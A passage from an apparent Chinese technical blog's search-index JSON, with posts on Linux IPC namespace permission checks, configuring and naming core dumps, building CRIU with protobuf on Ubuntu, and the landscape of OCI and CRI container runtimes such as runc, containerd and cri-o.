in_group_p(ipcp-&gt;gid)) granted_mode &gt;&gt;= 3; /* is there some bit set in requested_mode but not in granted_mode? */ // 判断请求的操作是否适配对应的规则 if ((requested_mode &amp; ~granted_mode &amp; 0007) &amp;&amp; !ns_capable(ns-&gt;user_ns, CAP_IPC_OWNER)) return -1; return security_ipc_permission(ipcp, flag);&#125; 相关系统调用sem,shm,mq 对象通用部分的解析如上所示，除此以外 XSI IPC 还有其他的操作系统调用，这里就不一一解析： Module Syscall Descript sem semget() 创建信号量 - semctl() 初始化信号量 - semop() 信号量的PV操作 msg msgget() 创建消息队列 - msgctl() 获取和设置消息队列的属性 - msgsnd() 将消息写入到消息队列 - msgrcv() 从消息队列读取消息 shm shmget() 创建共享内存对象 - shmctl() 共享内存管理 - shmat() 把共享内存区对象映射到调用进程的地址空间 - shmdt() 断开共享内存连接 参考资料Linux Namespace : IPC - sparkdev - 博客园 (cnblogs.com) ipc_namespaces(7) - Linux manual page — ipc_namespaces(7) - Linux 手册页 (man7.org)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"namespace","slug":"Linux内核/namespace","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/namespace/"}],"tags":[]},{"title":"学习 Linux Core dump","slug":"学习-Linux-Core-dump","date":"2023-12-28T02:36:24.000Z","updated":"2023-12-28T08:58:59.998Z","comments":true,"path":"2023/12/28/学习-Linux-Core-dump/","link":"","permalink":"http://example.com/2023/12/28/%E5%AD%A6%E4%B9%A0-Linux-Core-dump/","excerpt":"简介当程序运行的过程中异常终止或崩溃，操作系统会将程序当时的内存状态记录下来，保存在一个文件中，这种行为就叫做Core Dump（中文有的翻译成“核心转储”)。我们可以认为 core dump 是“内存快照”，但实际上，除了内存信息之外，还有些关键的程序运行状态也会同时 dump 下来，例如寄存器信息（包括程序指针、栈指针等）、内存管理信息、其他处理器和操作系统状态和信息。core dump 对于编程人员诊断和调试程序是非常有帮助的，因为对于有些程序错误是很难重现的，例如指针异常，而 core dump 文件可以再现程序出错时的情景。 Core dump如何产生","text":"简介当程序运行的过程中异常终止或崩溃，操作系统会将程序当时的内存状态记录下来，保存在一个文件中，这种行为就叫做Core Dump（中文有的翻译成“核心转储”)。我们可以认为 core dump 是“内存快照”，但实际上，除了内存信息之外，还有些关键的程序运行状态也会同时 dump 下来，例如寄存器信息（包括程序指针、栈指针等）、内存管理信息、其他处理器和操作系统状态和信息。core dump 对于编程人员诊断和调试程序是非常有帮助的，因为对于有些程序错误是很难重现的，例如指针异常，而 core dump 文件可以再现程序出错时的情景。 Core dump如何产生上面说当程序运行过程中异常终止或崩溃时会发生 core dump，但还没说到什么具体的情景程序会发生异常终止或崩溃，例如我们使用 kill -9 命令杀死一个进程会发生 core dump 吗？实验证明是不能的，那么什么情况会产生呢？ Linux 中信号是一种异步事件处理的机制，每种信号对应有其默认的操作，你可以在 这里 查看 Linux 系统提供的信号以及默认处理。默认操作主要包括忽略该信号（Ingore）、暂停进程（Stop）、终止进程（Terminate）、终止并发生core dump（core）等。如果我们信号均是采用默认操作，那么，以下几种信号，它们在发生时会产生 core dump: Signal Action Comment SIGABRT Core Abort signal from abort(3) SIGBUS Core Bus error (bad memory access) SIGFPE Core Floating-point exception SIGILL Core Illegal Instruction SIGQUIT Core Quit from keyboard SIGSEGV Core Invalid memory reference SIGSYS Core Bad system call (SVr4); see also seccomp(2) SIGTRAP Core Trace&#x2F;breakpoint trap SIGXCPU Core CPU time limit exceeded (4.2BSD); see setrlimit(2) SIGXFSZ Core File size limit exceeded (4.2BSD); see setrlimit(2) 这就是为什么我们使用 Ctrl+z 来挂起一个进程或者 Ctrl+C 结束一个进程均不会产生 core dump，因为前者会向进程发出 SIGTSTP 信号，该信号的默认操作为暂停进程（Stop Process）；后者会向进程发出SIGINT 信号，该信号默认操作为终止进程（Terminate Process）。同样上面提到的 kill -9 命令会发出 SIGKILL 命令，该命令默认为终止进程。而如果我们使用 Ctrl+\\ 来终止一个进程，会向进程发出 SIGQUIT 信号，默认是会产生 core dump 的。还有其它情景会产生 core dump， 如：程序调用 abort() 函数、访存错误、非法指令等等。 下面举两个例子来说明： 首先尝试手动配置核心文件的路径，例如，将 /proc/sys/kernel/core_pattern 设置为直接写入当前目录。你可以使用以下命令： 1echo &quot;core&quot; | sudo tee /proc/sys/kernel/core_pattern 终端下比较 Ctrl+C 和 Ctrl+\\: 运行一个sleep进程 1sleep 10 使用Ctrl+C中止进程不会产生core dump 使用Ctrl+\\退出程序，会产生core dump 小程序产生core dump 12345678#include &lt;stdio.h&gt;int main()&#123; int *null_ptr = NULL; *null_ptr = 10; //对空指针指向的内存区域写,会发生段错误 return 0;&#125; 编译执行，会产生core dump 某些信号的默认操作是导致进程终止并生成核心转储文件，该文件包含终止时进程内存的映像。该映像可用于调试器（例如 gdb(1)）来检查程序终止时的状态。导致进程转储核心的信号列表可以在signal(7) - Linux manual page (man7.org)中找到。 进程不生成core dump文件的情况 该进程没有写入core文件的权限。 （默认情况下，核心文件名为 core 或 core.pid，其中 pid 是转储核心的进程的 ID，并在当前工作目录中创建。 已存在一个与用于核心转储同名的（可写、常规）文件，但指向该文件的硬链接不只一个。 将创建核心转储文件的文件系统已满；或者已经用完索引节点；或以只读方式安装；或者用户已达到文件系统的配额。 要创建核心转储文件的目录不存在。 进程的RLIMIT_CORE（core文件大小）或RLIMIT_FSIZE（文件大小）资源限制设置为0；请参阅core(5) - Linux manual page — core(5) - Linux 手册页 (man7.org)和 shell 的 ulimit 命令的文档（csh(1) 中的限制）。但是，如果系统配置为通过管道将核心转储传输到程序，则 RLIMIT_CORE 将被忽略。 进程正在执行的二进制文件没有启用read权限。（这是一项安全措施，以确保内容不可读的可执行文件不会生成包含可执行文件映像的（可能可读的）核心转储。） 进程正在执行set-user-ID (set-group-ID)程序，该程序由进程的real user（group）ID 以外的user（group）拥有，或者进程正在执行具有以下权限的程序： File capabilities（请参阅capabilities(7) - Linux manual page (man7.org)）。 （但是，请参见prctl(2) - Linux manual page (man7.org)PR_SET_DUMPABLE 操作的描述，以及proc(5) - Linux manual page (man7.org)中 &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;suid_dumpable 文件的描述。） &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 为空且 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_uses_pid 包含值 0。（请注意，如果 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 为空且 &#x2F;proc&#x2F; sys&#x2F;kernel&#x2F;core_uses_pid 包含值 1，核心转储文件将具有 .pid 形式的名称，除非使用 ls(1) - Linux manual page (man7.org) -a 选项，否则此类文件将被隐藏。 （自Linux 3.7 起）内核配置时未使用CONFIG_COREDUMP 选项。此外，如果使用 madvise(2) - Linux manual page (man7.org)MADV_DONTDUMP 标志，则核心转储可能会排除进程的部分地址空间。在systemd(1) - Linux manual page (man7.org)使用作为 init 框架的系统上，核心转储可能会放置在由systemd(1) - Linux manual page (man7.org)确定的位置。 核心转储文件的命名默认情况下，核心转储文件命名为 core，但可以设置 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 文件（自 Linux 2.6 和 2.4.21 起）来定义用于命名核心转储的模板文件。模板可以包含 % 说明符，在核心文件创建时，模板中的特殊字符 % 将被替换为以下值 %%: 单个百分号字符。 %c: 崩溃进程的核心文件大小软资源限制（自 Linux 2.6.24 起）。 %d: 转储模式，与 prctl(2) 返回的值相同（自 Linux 3.7 起）。 %e: 进程或线程的 comm 值，通常与可执行文件名相同（不包含路径前缀，截断为最多 15 个字符），但可能已修改为其他内容；参见 proc(5) 中关于 &#x2F;proc&#x2F;pid&#x2F;comm 和 &#x2F;proc&#x2F;pid&#x2F;task&#x2F;tid&#x2F;comm 的讨论。 %E: 可执行文件的路径，斜杠 (‘&#x2F;‘) 替换为感叹号 (‘!’)（自 Linux 3.0 起）。 %g: 被转储进程的实际 GID 数值。 %h: 主机名（与 uname(2) 返回的 nodename 相同）。 %i: 触发核心转储的线程的 TID，如在线程所在的 PID 命名空间中看到的（自 Linux 3.18 起）。 %I: 触发核心转储的线程的 TID，如在初始 PID 命名空间中看到的（自 Linux 3.18 起）。 %p: 被转储进程的 PID，如在进程所在的 PID 命名空间中看到的。 %P: 被转储进程的 PID，如在初始 PID 命名空间中看到的（自 Linux 3.12 起）。 %s: 引起转储的信号编号。 %t: 转储时间，表示自 1970 年 1 月 1 日 00:00:00 +0000（协调世界时）以来的秒数。 %u: 被转储进程的实际 UID 数值。 这些替换值允许你根据需要自定义核心转储文件的命名方式，以便更好地识别和组织这些文件。 例如： 可以使用以下命令设置： 1echo &quot;core.%e.%p&quot; | sudo tee /proc/sys/kernel/core_pattern 运行一个a.out的可执行文件就生成的核心转储文件如下所示 core.a.out.340652 或者 12echo &quot;|/var/coredumps/core.%e.%p&quot; | sudo tee /proc/sys/kernel/core_pattern 注意事项 模板末尾的单个 % 字符会从核心文件名中删除。 % 后跟除特定字符之外的任何字符的组合都将从核心文件名中删除。 模板中的所有其他字符都成为核心文件名的文字部分。 模板可以包含 / 字符，被解释为目录名称的分隔符。 生成的核心文件名的最大大小为 128 字节（64 字节在 Linux 2.6.19 之前）。 如果 /proc/sys/kernel/core_pattern 不包含 %p 且 /proc/sys/kernel/core_uses_pid 是非零的话，将在核心文件名后附加 .PID。 路径是根据崩溃进程的活动设置来解释的，包括崩溃进程的mount namespace、当前工作目录和根目录。 打开Core Dump打开 core dump 功能 在终端中输入命令 ulimit -c ，输出的结果为 0，说明默认是关闭 core dump 的，即当程序异常终止时，也不会生成 core dump 文件。 我们可以使用命令 ulimit -c unlimited 来开启 core dump 功能，并且不限制 core dump 文件的大小； 如果需要限制文件的大小，将 unlimited 改成你想生成 core 文件最大的大小，注意单位为 blocks（KB）。 用上面命令只会对当前的终端环境有效，如果想需要永久生效，可以修改文件 /etc/security/limits.conf文件，关于此文件的设置参看 这里 。增加一行: 123456# /etc/security/limits.conf##Each line describes a limit for a user in the form:##&lt;domain&gt; &lt;type&gt; &lt;item&gt; &lt;value&gt; * soft core unlimited 修改 core 文件保存的路径 默认生成的 core 文件保存在可执行文件所在的目录下，文件名就为 core。 通过修改 /proc/sys/kernel/core_uses_pid 文件可以让生成 core 文件名是否自动加上 pid 号。例如 echo 1 &gt; /proc/sys/kernel/core_uses_pid ，生成的 core 文件名将会变成 core.pid，其中 pid 表示该进程的 PID。 还可以通过修改 /proc/sys/kernel/core_pattern 来控制生成 core 文件保存的位置以及文件名格式。例如可以用 echo &quot;/tmp/corefile-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern 设置生成的 core 文件保存在 “&#x2F;tmp&#x2F;corefile” 目录下，文件名格式为 “core-命令名-pid-时间戳”。**这里** 有更多详细的说明！ 参考资料Linux Core Dump - hazir - 博客园 (cnblogs.com) core(5) - Linux manual page (man7.org)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[]},{"title":"Ubuntu安装CRIU","slug":"Ubuntu安装CRIU","date":"2023-12-27T01:27:51.000Z","updated":"2023-12-27T08:46:37.770Z","comments":true,"path":"2023/12/27/Ubuntu安装CRIU/","link":"","permalink":"http://example.com/2023/12/27/Ubuntu%E5%AE%89%E8%A3%85CRIU/","excerpt":"下载CRIUIndex of &#x2F;criu (openvz.org) 解压","text":"下载CRIUIndex of &#x2F;criu (openvz.org) 解压 1tar -xvf criu-3.16.tar.bz2 进入文件夹 1cd criu-3.16 安装依赖安装protobuf下载 1wget https://github.com/protocolbuffers/protobuf/releases/download/v21.0/protobuf-all-21.0.tar.gz 进入文件夹 1cd protobuf 安装依赖 1sudo apt-get install autoconf automake libtool curl make g++ unzip 执行 1./autogen.sh 1./configure 1make 1make check 1sudo make install protobuf-c下载 1git clone git@github.com:protobuf-c/protobuf-c.git 安装依赖 1sudo apt-get install -y pkg-config 1sudo apt-get install protobuf-compiler 1sudo apt-get install libprotobuf-dev 执行 1./autogen.sh 1./configure 1make 1sudo make install 如果make出现错误 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;protoc: error while loading shared libraries: libprotoc.so.32: cannot open shared object file: No such file or directory 执行下面 1vim /etc/ld.so.conf.d/libprotobuf.conf 内容如下 1/usr/local/lib 然后执行 1sudo ldconfig 1vim /etc/profile 在末尾添加 1LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH 执行 1source /etc/profile 剩余依赖1sudo apt-get install libnet-dev 1sudo apt-get install libnl-3-dev 1sudo apt-get install libcap-dev 1sudo apt-get install asciidoc 12sudo apt-get install protobuf-c-compiler sudo apt-get install python-protobuf 继续继续执行 1make 1sudo make install 测试执行 1sudo criu check 输出Looks Good！就是成功了","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[]},{"title":"容器运行时 container runtime","slug":"容器运行时-container-runtime","date":"2023-12-26T09:10:40.000Z","updated":"2023-12-28T03:27:59.048Z","comments":true,"path":"2023/12/26/容器运行时-container-runtime/","link":"","permalink":"http://example.com/2023/12/26/%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6-container-runtime/","excerpt":"简介容器运行时（container runtime）是负责在主机上创建、运行和管理容器的软件组件。它是整个容器化环境中的关键组成部分，与操作系统内核紧密交互，负责管理容器的生命周期、资源隔离、文件系统挂载和网络连接等功能。 容器运行时提供了对容器的抽象层，使得容器可以像独立的进程一样在主机上运行。它通常包括以下主要功能：","text":"简介容器运行时（container runtime）是负责在主机上创建、运行和管理容器的软件组件。它是整个容器化环境中的关键组成部分，与操作系统内核紧密交互，负责管理容器的生命周期、资源隔离、文件系统挂载和网络连接等功能。 容器运行时提供了对容器的抽象层，使得容器可以像独立的进程一样在主机上运行。它通常包括以下主要功能： 容器生命周期管理：容器运行时负责创建、启动、停止和销毁容器。它与操作系统内核进行交互，使用容器的配置和镜像来创建和管理容器进程。 资源隔离：容器运行时通过使用操作系统提供的隔离机制（如Linux的命名空间和控制组）来确保容器之间的资源隔离。这样，每个容器都有自己的进程空间、文件系统、网络和其他资源，使得它们可以独立运行而不会相互干扰。 文件系统挂载：容器运行时负责将容器内的文件系统挂载到主机上，以便容器可以访问主机上的文件和目录。它也负责管理容器的镜像文件系统，将容器镜像解压缩并创建容器的文件系统。 网络连接：容器运行时负责为容器分配网络资源，并与主机的网络进行连接。它可以配置容器的网络接口、端口映射和网络策略，以便容器可以与其他容器或外部网络进行通信。 常见的容器运行时包括Docker的默认运行时（Docker Engine）、containerd、CRI-O、runc等。这些容器运行时提供了标准的接口和功能，使得开发人员可以方便地创建和管理容器化应用程序。 容器运行机制那么，当你运行 podman run 或 docker run 命令时，在后台到底发生了什么？一个分步的概述如下： 如果本地没有镜像，则从镜像登记仓库registry拉取镜像 镜像被提取到一个写时复制（COW）的文件系统上，所有的容器层相互堆叠以形成一个合并的文件系统 为容器准备一个挂载点 从容器镜像中设置元数据，包括诸如覆盖 CMD、来自用户输入的 ENTRYPOINT、设置 SECCOMP 规则等设置，以确保容器按预期运行 提醒内核为该容器分配某种隔离，如进程、网络和文件系统（命名空间namespace） 提醒内核为该容器分配一些资源限制，如 CPU 或内存限制（控制组cgroup） 传递一个系统调用syscall给内核用于启动容器 设置 SELinux&#x2F;AppArmor 容器运行时负责上述所有的工作。当我们提及容器运行时，想到的可能是 runc、lxc、containerd、rkt、cri-o 等等。嗯，你没有错。这些都是容器引擎和容器运行时，每一种都是为不同的情况建立的。 容器运行时Container runtime更侧重于运行容器，为容器设置命名空间和控制组（cgroup），也被称为底层容器运行时。高层的容器运行时或容器引擎专注于格式、解包、管理和镜像共享。它们还为开发者提供 API。 容器运行时分类通常，它们分为两大类：OCI 运行时和 CRI（容器运行接口）。 开放容器规范（OCI）运行时 本地运行时 runC Railcar Crun rkt 沙盒和虚拟化运行时 gviso nabla-containers runV clearcontainers kata-containers CRI containerd cri-o 开放容器规范（OCI）运行时开放容器计划Open Container Initiative（OCI，Open Container Initiative）标准是由 Docker 公司主导的一个关于容器格式和运行时的标准或规范，包含运行时标准（runtime-spec ）和容器镜像标准（image-spec）。运行时标准规定了怎么去运行一个容器，如何去表达容器的状态（state）和生命周期（lifestyle）、如何设置 namespace、cgroup、文件系统等等，可以理解为运行期的动态描述；而容器镜像标准规定了容器镜像的格式、配置、元数据等，可以理解为对镜像的静态描述。 为什么要搞这么一个标准呢？应该是为了防止各家容器各有一套互不兼容的格式导致生态过于碎片化，另外一个目的是尽管目前只有 Linux 系统有容器，但万一我们要在 Windows 或者 Unix 上实现容器，要不要重新搞一套标准呢？OCI 规范也可以在其他操作系统和平台上实现。 OCI运行时有时称为「低级别」运行时，实现 OCI 运行时规范专注于管理容器的生命周期——抽象了 Linux 原语——并且无需其它操作。 低级别运行时创建和运行「容器」。 它通过两个规范来完成如下任务： 镜像规范该规范的目标是创建可互操作的工具，用于构建、传输和准备运行的容器镜像。 该规范的高层组件包括： 镜像清单 — 一个描述构成容器镜像的元素的文件 镜像索引 — 镜像清单的注释索引 镜像布局 — 一个镜像内容的文件系统布局 文件系统布局 — 一个描述容器文件系统的变更集 镜像配置 — 确定镜像层顺序和配置的文件，以便转换成 运行时捆包 转换 — 解释应该如何进行转换的文件 描述符 — 一个描述被引用内容的类型、元数据和内容地址的参考资料 运行时规范该规范用于定义容器的配置、执行环境和生命周期。config.json 文件为所有支持的平台提供了容器配置，并详细定义了用于创建容器的字段。在详细定义执行环境时也描述了为容器的生命周期定义的通用操作，以确保在容器内运行的应用在不同的运行时环境之间有一个一致的环境。 Linux 容器规范使用了各种内核特性，包括命名空间namespace、控制组cgroup、权能capability、LSM 和文件系统隔离jail等来实现该规范。 本地运行时 native runtimes本地低级别运行时包括： runC railcar（弃用） crun rkt（弃用） runC Docker 在 libcontainer 和 OCI 上的所有工作结果。这是事实上的标准低级别的运行时。由 Go 编写的，并由 Docker 开源的 moby 项目维护。 Railcar 是 Oracle 创建的 OCI 运行时实现。由 Rust 编写，与 runC 的 Go 代码相比，他们人为，对于像容器运行时这样的组件而言，Rust 是 一种出色的语言，它可以与内核进行低级别的交互。不幸的是，Railcar 已经被遗弃。 crun 是 Redhat 领导的 OCI 实现，也是容器项目更广泛的一部分，也是 libpod 的同级产品（稍后会详细介绍）。它是由 C 开发的，性能好且轻量级。 并且是最早支持 cgroup v2 的运行时。 rkt 不是一个 OCI 运行时的实现，但这是一个类似低级别的容器运行时。除了 appc 捆绑之外，它支持运行 Docker 和 OCI 镜像，但不能与使用 OCI 运行时 高级别的组件交互。 需要注意的是，正如我们在本次开源峰会演讲所看到的，低级别的运行时性能仅在容器创建和删除期间才有意义。一旦进程运行之后，容器运行时就消失了。 沙盒和虚拟化运行时除了本地运行时，还可以在同一个主机内核上运行容器化的进程，有一些 OCI 规范的沙盒化和虚拟化实现： gVisor nabla-containers runV（被非正式弃用） clearcontainers（弃用） kata-containers gVisor 和 Nabla 是沙盒化的运行时，这样可以进一步的隔离宿主和容器化的进程。取代共享主机内核，容器化的进程在 unikernel 或者内核代理层运行， 然后代表容器与主机内核进行交互。随着逐渐增多的隔离，这些运行时减少了攻击面，使容器化进程对主机产生恶意影响的可能性降低。 runV, Clear 和 Kata 是虚拟化的运行时。它们是 OCI 运行时规范的实现，有虚拟机接口（而不是主机内核）支持。runV 和 Clear 已经被废弃， 他们的特性被 Kata 所吸收。它们都可以运行标准的 OCI 容器镜像，尽管它们通过更强的主机隔离来做到这一点。它们使用标准的 Linux 内核镜像并在虚拟机 中运行「容器化」的进程。 与本地运行时相比，沙盒化和虚拟化运行时在整个容器化进程的生命周期中都会对性能产生影响。在沙盒容器中，有一个额外的抽象层：进程运行在沙盒的 unikernetl&#x2F;代理上运行，该指令中继到主机内核。在虚拟化的容器中，有一层虚拟化：进程全部在虚拟机中运行，这样会比直接在本地运行慢。将 VM 技术 （如注重性能的 AWS Firecracker）用作 VM 容器的支持虚拟机类型可以最大程度上减少性能的影响。 容器运行时接口ORI当引入 Kubernetes 容器编排时，Docker 运行时硬编码到机器的守护进程中，也就是 kubelet 。但是，随着 Kubernetes 的迅速流行，社区开始有 替代运行时的需求。 rkt 通过自定义 rkt 的 kubelet 代码（rktlet）添加了支持。但是这种基于运行时的自定义构建过程不能扩展，并且暴露了 Kubernetes 对抽象运行时 模型的需求。为了解决这个问题，Hyper，CoreOS，Google 和其它的 Kubernetes 赞助合作商在容器编排的角度上抽象了容器运行时的高级规范：也就是 CRI（Container Runtime Interface）。与 CRI 集成（而不是特定的运行时）允许 kubelet 支持多个容器运行时，而无需为每个运行时编译自定义的 kubelet。 CRI 对 OCI 运行时还存在其它额外的担忧，包括镜像管理和分发，存储，快照，网络（与 CNI 有所不同），等等。CRI 还有在动态云环境中对容器所需的功能， 与 OCI 运行时不同，OCI 运行时始终专注于在机器上创建容器。此外，CRI 通常委托 OCI 运行时进行实际的容器执行。通过引入 CRI，Kubernetes 的坐着 以可扩展的方式有效的将 kubelet 与基础容器运行时进行解耦。 最初的 CRI 实现是 dockershim ，它在 Docker 引擎之前提供了一层约定的抽象。后来 containerd 和 runC 从 Docker 的核心中分离出来， 后来 Docker 这一层就变得不重要了，因为 containerd 提供了完整的 CRI 实现。 还有一个 VM CRI， frakti （v1），是第一个 非 Docker CRI 的实现。它是为以下目的创建的，旨在与之配合使用：runV 并提供与本机 OCI 支持的 CRI 相同的功能，但有 VM。由于 Kata 吸收了 Clear 和 runV 功能集合，因此 frakti 的重要性降低了 —— containerd + kata 是更现代的 frakti + runV。 目前，CRI 领域有两个主要的参与者： containerd cri-o containerd 是 Docker 的高级别运行时，在 Moby 项目下开源管理和开发。默认情况下，底层是 runC 。就像其它来自 Docker 容器工具一样， 它是当前事实上的标准 CRI。它提供了 CRI 的所有核心功能以及更多其它功能3，这是我们在 Critical Stack 中的 CRI，我们基于 Kubernetes 构建的 容器编排平台。containerd 有一个插件的设计 - cri-containerd 实现了 CRI，并且存在各种 shims 来将 containerd 和低级别的运行时集合在一起 （比如 Kata）。 cri-o 是由 Redhat 领导的一个瘦（slim）的 CRI 实现，专为 Kubernetes 设计。它旨在充当 CRI 和支持的 OCI 运行时的轻量级桥梁。 相比 containerd 具有较少的外围功能，并委托 libpod 和容器工具项目4中的组件进行镜像管理和存储。默认情况下，cri-o 使用 runC 作为它的 OCI， 但是在最近的 Redhat Fedora 安装（cgroups v2）使用的是 crun。由于它具有完全的 OCI 兼容性，cri-o 与低级别的运行时开箱即用5， 比如 kata，不需要其它的零部件，而且很小的配置即可。 这两个 CRIs 都通过本机交互操作或者 shim&#x2F;插件（包括沙盒和虚拟化实现）支持上述所有的 OCI 运行时的交互操作。 容器引擎你可能注意到了 Docker 不是 CRI 或者 OCI 的实现，而是包含了 containerd 和 runC。事实上，它具有 CRI 或者 OCI 范围之外的其他功能， 比如镜像构建和签名。那么，它的应用场景在哪些方面呢？ Docker 的产品叫『Docker 引擎』，并且通常将这些完整的容器工具套件称之为『容器引擎』。除了 Docker 之外，没有一个可执行文件提供如此功能齐全的 的功能，但是我们可以从容器工具（Container Tools）项目中拼凑出类似的工具。 Container Tools 项目遵循了 UNIX 小型工具哲学，每个工具只做好一件事情： podman - 运行镜像 buildah - 构建镜像 skopeo - 分发镜像 实际上，这些是独立 Docker 堆栈的替代方案，包括 cri-o（cri-o 项目替代了最后缺少的一部分）。 各种容器运行时解决了什么问题低级容器运行时低级容器运行时 (Low level Container Runtime)，一般指按照 OCI 规范实现的、能够接收可运行文件系统（rootfs） 和 配置文件（config.json）并运行隔离进程的实现。 这种运行时只负责将进程运行在相对隔离的资源空间里，不提供存储实现和网络实现。但是其他实现可以在系统中预设好相关资源，低级容器运行时可通过 config.json 声明加载对应资源。我在文章 理解 OCI 详细介绍了 runC 的执行细节，并展示了如何使用 Linux namespace network 为容器添加可与宿主机通信的虚拟网卡。 低级运行时的特点是底层、轻量、灵活，限制也很明显： 只认识 rootfs 和 config.json，不认识镜像 (下文简称 image)，不具备镜像存储功能，也不能执行镜像的构建、推送、拉取等（我们无法使用 runC, kata-runtime 处理镜像） 不提供网络实现，所以真正使用时，往往需要利用 CNI 之类的实现为容器添加网络 不提供持久实现，如果容器是有状态应用需要使用文件系统持久状态，单机环境可以挂载宿主机目录，分布式环境可以自搭 NFS，但多数会选择云平台提供的 CSI 存储实现 与特定操作系统绑定无法跨平台，比如 runC 只能在 Linux 上使用；runhcs 只能在 Windows 上使用 解决了这些限制中一项或者多项的容器运行时，就叫做高级容器运行时 (High level Container Runtime)。 高级容器运行时高级容器运行时首先要做的是打通 OCI image spec 和 runtime spec，直白来说就是高效处理 image 到 rootfs 和 config.json 的转换。config.json 的生成比较简单，运行时可以结合 image config 和请求方需求直接生成；较为复杂的部分是 image 到 rootfs 的转换，这涉及镜像拉取、镜像存储、镜像 layer 解压、解压 layer \b文件系统（fs layer) 的存储、合并 fs layer 为 rootfs。 镜像拉取模块先从 image registry 获取清单（manifest）文件，处理过程不仅需要兼容 OCI image 规范，考虑到 Docker 生态，也需兼容 Docker image 规范（所幸两者区别并不大）。运行时实现先从 manifest 获取 layer list，先检查对应 layer 在本地是否存在，如果不存在则下载对应 layer。下载的 layer tar 或者 tar.gz 一般直接存储磁盘，为实现快速处理，需要建立索引，比如从 reference:tag （如 docker.io&#x2F;library&#x2F;redis:6.0.5-alpine) 到 manifest 存储路径的映射；当然，layer 的访问比 image 高频，layer sha256 值到对应存储路径也会被索引。因此 ，运行时一般会围绕 image 索引和 image layer 存储组织独立模块对其他模块提供服务。 如果要转换 image layers 到 rootfs，就要逐层解压 layers 为 filesystem layer（fs layer) 再做合并。这带来了几个问题，首先是 fs layer 同样需要存储磁盘多次复用，那么就需要有一个方式从 image 映射到对应 fs layers；接着类似 image layer，需要建立索引维系 fs layers 之间的父子关系，尽可能复用里层文件，避免重复工作；最后是层次复用带来的烦恼，隔离进程运行之后会发生 rootfs 写入，需要以某种方式避免更改发生到共享的 fs layers。 第一个问题一般使用 image config 文件中的 diffID 解决，每解压一层 layer，就使用上一层 fs layer id 和 本层 diffID 的拼接串做 sha256 hash，输出结果作为本层对应的 fs layer id（最里层 id 为其 diffID），接着建立 id 到磁盘路径索引。因此只要通过 image manifest 文件找到 image config 文件，即可找到所有 fs layers，详细实现方式见 OCI image spec layer chain id。 第二个问题解决方式很简单，在每个 fs layer 索引存储上一层 fs layer id 即可。 第三个问题，一般通过 UnionFS 提供的 CopyOnWrite 技术解决，简单来说，就是使用空文件夹，在镜像对应 fs layer 最外层之上再生成一层 layer，使用 UnionFS 合并（准确来说是挂载 mount）时将其声明为 work 目录（或者说 upper 目录）。UnionFS 挂载出 rootfs 之后，隔离进程所做的任何写操作（包括删除）都只体现在 work layer，而不会影响其他 fs layer。（详细介绍可以参考 陈皓的介绍文章) 最后，高级运行时需要充当隔离进程管理者角色，而一个低级运行时（如 runC ）可能同时被多个高级运行时使用。同时试想，如果隔离进程退出，如何以最快的方式恢复运行？高级运行时实现一般都会引入 container 抽象（或者说 container meta），meta 存储了 ID、 image 信息、低级运行时描述、OCI spec (json config）、 work layer id 以及 K-V 结构的 label 信息。因此只要创建出 container meta，后续所有与隔离进程相关操作，如进程运行、进程信息获取、进程 attach、进程日志获取，均可通过 container ID 进行。 containerdcontainerd 是一个高度模块化的高级运行时，所有模块均以 RPC service 形式加载（gRPC 或者 TTRPC），所有模块均可插拔。不同插件通过声明互相依赖，由 containerd 核心实现统一加载，使用方可以使用 Go 语言实现编写插件实现更丰富的功能。不过这种设计使得 containerd 拥有强大的跨平台能力，并能够作为一个组件轻松嵌入其他软件，也带来一个弊端，模块之间功能互调也从简单的函数调用，变成了更为昂贵的 RPC 调用。 注：TTRPC 是一种基于 gRPC 的改良通信协议。 containerd 大多功能模块很容易与上文提到的「第一要务」相联系 ： Content，以 image layer 哈希值（一般使用 sha256 算法生成）为索引，支持快速 layer 快速查找和读取，并支持对 layer 添加 label。索引和 label 信息存储在 boltDB。 Images，在 boltDB 中存储了 reference 到 manifest layer 的映射，结合 Content 可以组织完整的 image 信息。 Snapshot，存储、处理解压后的 fs layers 和容器 work layer，索引信息同样存储在 boltDB。Snapshot 内置支持多种 UnionFS（如 overlay，aufs，btrfs）。 Containers，以 container ID 为索引，在 boltDB 中存储了低级运行时描述、 snapshot 文件系统类型、 snapshotKey（work layer id）、image reference 等信息。 Diff，可用于比对 image layer tar 和 fs layers 差异输出 diffID，可以校验 image config 中的 diffID，同样也能比对 fs layers 之间的差异。 基于以上模块，containerd 提供了 namespace 隔离，实现上是在各模块的内容放置于不同目录树，达到资源隔离效果。比如，它可以一边服务于 Docker，一边服务 k8s kubelet，做到两不冲突。 还有重要模块是 Tasks (runtime.PlatformRuntime)，它负责容器进程管理和与低级运行时打交道，对上统一了容器进程运行接口。v1 版 Tasks 只支持 Linux，1.2.0 (2018&#x2F;11) 后 containerd 正式支持 Windows，新引入的 v2 版 Tasks 核心逻辑使用平台无关代码实现，因此可以在 Go 语言支持的大部分平台运行（包括 macOS darwin&#x2F;amd64)。 \bcontainerd 运行容器，一般先从 Images 模块触发，结合 Snapshot 模块建立新的容器 fs layer，加上低级运行时信息，组合成 container 结构体。containerd 利用 container 结构体，将之前的所有 Snapshots 转换为 Mounts 对象（声明了所有子文件夹的位置和挂载方式），结合低级运行时、OCI spec、镜像等信息在请求体中，向 Tasks 模块提交任务请求。Tasks 模块 Manager 根据任务低级运行时信息（如 io.containerd.runc.v1），组合出统一的 containerd-shim 进程运行命令，通过系统调用启动 shim 进程，并同步建立与 shim 进程的 TTRPC 通信。随后将任务交给 shim 进程管理。shim 进程接到请求后，判知 Mounts 